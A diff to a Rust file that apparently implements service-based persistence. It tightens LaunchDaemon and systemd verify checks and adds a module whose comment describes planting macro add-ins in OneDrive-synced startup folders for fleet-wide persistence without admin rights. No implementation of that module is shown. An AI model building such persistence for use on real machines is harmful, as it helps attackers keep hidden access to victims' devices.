@@ -2734,9 +2734,31 @@ pub mod macos {
         }
 
         fn verify(&self) -> Result<bool> {
-            Ok(std::path::Path::new("/Library/LaunchDaemons")
-                .join(format!("{}.plist", self.label))
-                .exists())
+            let plist_path = std::path::Path::new("/Library/LaunchDaemons")
+                .join(format!("{}.plist", self.label));
+            if !plist_path.exists() {
+                return Ok(false);
+            }
+            // Also verify the service is loaded via launchctl.
+            #[cfg(target_os = "macos")]
+            {
+                let out = std::process::Command::new("launchctl")
+                    .args(["list", &self.label])
+                    .output();
+                if let Ok(output) = out {
+                    // If the service is loaded, launchctl list <label> prints
+                    // its status dictionary.  A non-zero exit code or an empty
+                    // stdout means it is not currently loaded.
+                    let stdout = String::from_utf8_lossy(&output.stdout).trim().to_string();
+                    if stdout.is_empty() {
+                        log::warn!(
+                            "LaunchDaemon::verify: plist exists but service not loaded"
+                        );
+                        return Ok(false);
+                    }
+                }
+            }
+            Ok(true)
         }
     }
 
@@ -3297,11 +3319,23 @@ pub mod linux {
         }
 
         fn verify(&self) -> Result<bool> {
-            let out = std::process::Command::new("systemctl")
+            // Check both "is-enabled" and "is-active" so we confirm the unit
+            // file is present *and* the service is currently running.
+            let enabled = std::process::Command::new("systemctl")
                 .args(["--user", "is-enabled", &self.service_name])
                 .output()
                 .map_err(|e| anyhow!("SystemdService::verify: {}", e))?;
-            Ok(String::from_utf8_lossy(&out.stdout).trim() == "enabled")
+            if String::from_utf8_lossy(&enabled.stdout).trim() != "enabled" {
+                return Ok(false);
+            }
+            let active = std::process::Command::new("systemctl")
+                .args(["--user", "is-active", &self.service_name])
+                .output()
+                .map_err(|e| anyhow!("SystemdService::verify: is-active: {}", e))?;
+            let status = String::from_utf8_lossy(&active.stdout).trim().to_string();
+            // "active" means running; "activating" is also acceptable (still
+            // starting up).  "inactive" / "failed" means not running.
+            Ok(status == "active" || status == "activating")
         }
     }
 
@@ -3614,11 +3648,20 @@ pub mod linux {
         }
 
         fn verify(&self) -> Result<bool> {
-            let out = std::process::Command::new("systemctl")
+            // Check both "is-enabled" and "is-active".
+            let enabled = std::process::Command::new("systemctl")
                 .args(["is-enabled", &self.service_name])
                 .output()
                 .map_err(|e| anyhow!("SystemdSystemService::verify: {}", e))?;
-            Ok(String::from_utf8_lossy(&out.stdout).trim() == "enabled")
+            if String::from_utf8_lossy(&enabled.stdout).trim() != "enabled" {
+                return Ok(false);
+            }
+            let active = std::process::Command::new("systemctl")
+                .args(["is-active", &self.service_name])
+                .output()
+                .map_err(|e| anyhow!("SystemdSystemService::verify: is-active: {}", e))?;
+            let status = String::from_utf8_lossy(&active.stdout).trim().to_string();
+            Ok(status == "active" || status == "activating")
         }
     }
 
@@ -3819,3 +3862,14 @@ pub mod linux {
         }
     }
 }
+
+// ──────────────────────────────────────────────────────────────────────────────
+// Office Add-in Persistence via OneDrive Sync
+// ──────────────────────────────────────────────────────────────────────────────
+// Deploys macro-enabled Excel (.xlam) or Word (.dotm) add-ins to OneDrive-
+// synced XLSTART / STARTUP folders.  The add-in is automatically replicated
+// to every device the user signs into via OneDrive, providing fleet-wide
+// persistence through Microsoft's own sync infrastructure with zero per-
+// machine deployment.  No Administrator privileges required.
+#[cfg(all(windows, feature = "office-addin"))]
+pub mod office_addin;
